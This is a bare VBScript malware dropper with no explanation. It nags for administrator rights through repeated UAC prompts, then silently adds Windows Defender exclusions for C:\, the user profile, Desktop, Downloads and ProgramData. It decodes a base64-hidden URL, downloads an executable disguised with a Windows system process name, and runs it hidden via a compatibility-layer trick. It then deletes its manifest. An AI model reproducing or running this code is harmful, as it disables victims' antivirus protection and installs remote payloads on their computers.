Dim objFSO, objShell, objWMI, colProcesses, objProcess
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application")
Set objWMI = GetObject("winmgmts:\\.\root\CIMV2")

On Error Resume Next
Dim testFile
Set testFile = objFSO.CreateTextFile("C:\Windows\System32\test.bat", True)
If Err.Number <> 0 Then
    On Error GoTo 0
    Do
        objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
        WScript.Sleep 3000
        Set colProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
        If colProcesses.Count > 0 Then Exit Do
    Loop
    
    For Each objProcess in colProcesses
        objProcess.Terminate(0)
    Next
Else
    On Error GoTo 0
    testFile.WriteLine "РЈСЃРїРµС€РЅР°СЏ Р·Р°РїРёСЃСЊ!"
    testFile.Close
    objShell.ShellExecute "cmd.exe", "C:\Windows\System32\test.bat", "", "open", 1
End If

Set WshShell = CreateObject("WScript.Shell")
psCommand = "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\ProgramData'; " & _
    "$desktopPath = [Environment]::GetFolderPath('Desktop'); " & _
    "$downloadsPath = [Environment]::GetFolderPath('UserProfile') + '\Downloads'; " & _
    "Add-MpPreference -ExclusionPath $desktopPath; " & _
    "Add-MpPreference -ExclusionPath $downloadsPath"""
WshShell.Run psCommand, 0, True

userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")

command1 = "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\ /t REG_DWORD /d 0 /f"
command2 = "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v """ & userProfile & """ /t REG_DWORD /d 0 /f"

WshShell.Run command1, 0, True
WshShell.Run command2, 0, True

Set objShell = CreateObject("WScript.Shell")
encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2FuZGV6enpXVy9kZWF0aC1ub3RlL3Jhdy9yZWZzL2hlYWRzL21haW4vV21pUHJ2U0UuZXhl"
psCommand = "powershell -Command " & Chr(34) & "$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedUrl & "')); Invoke-WebRequest -Uri $url -OutFile 'C:\ProgramData\WmiPrvVE.exe'" & Chr(34)
WScript.Sleep 10000
objShell.Run psCommand, 0, True
WScript.Sleep 10000

Set WshShell = CreateObject("WScript.Shell")
Set objShell = CreateObject("Shell.Application")

manifest = "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>" & _
"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">" & _
"<trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">" & _
"<security>" & _
"<requestedPrivileges>" & _
"<requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>" & _
"</requestedPrivileges>" & _
"</security>" & _
"</trustInfo>" & _
"</assembly>"

manifestPath = "C:\ProgramData\WmiPrvVE.exe.manifest"
Set fso = CreateObject("Scripting.FileSystemObject")
Set manifestFile = fso.CreateTextFile(manifestPath, True)
manifestFile.Write(manifest)
manifestFile.Close

WshShell.Run "cmd.exe /c set __COMPAT_LAYER=RunAsInvoker && start """" /B ""C:\ProgramData\WmiPrvVE.exe""", 0, False

fso.DeleteFile(manifestPath)

WshShell.Run "cmd.exe /c timeout 1 /nobreak > nul", 0, True